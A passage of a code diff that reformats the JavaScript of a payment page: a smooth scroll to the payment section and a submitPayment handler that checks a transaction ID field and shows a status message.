-
-});
-
-},
-100
-);
+  setTimeout(function() {
+    payment.scrollIntoView({
+      behavior: "smooth",
+      block: "center"
+    });
+  }, 100);
 
 };
 
 
 /* UTR */
 
-window.submitPayment =
-function(){
+window.submitPayment = function() {
 
-const utr =
-document.getElementById(
-"utr"
-).value.trim();
+  const utr =
+    document.getElementById("utr").value.trim();
 
+  const paymentStatus =
+    document.getElementById("payment-status");
 
-const paymentStatus =
-document.getElementById(
-"payment-status"
-);
+  if (!utr) {
+    paymentStatus.textContent =
+      "Please enter your transaction ID.";
+    return;
+  }
 
-
-if(!utr){
-
-paymentStatus.textContent =
-"Please enter your transaction ID.";
-
-return;
-
-}
-
-
-paymentStatus.textContent =
-"Payment details received. Verification is required before approval.";
+  paymentStatus.textContent =
+    "Payment details received. Verification is required before approval.";
 
 };
 
 </script>
 
 </body>
-  </html>
+</html>
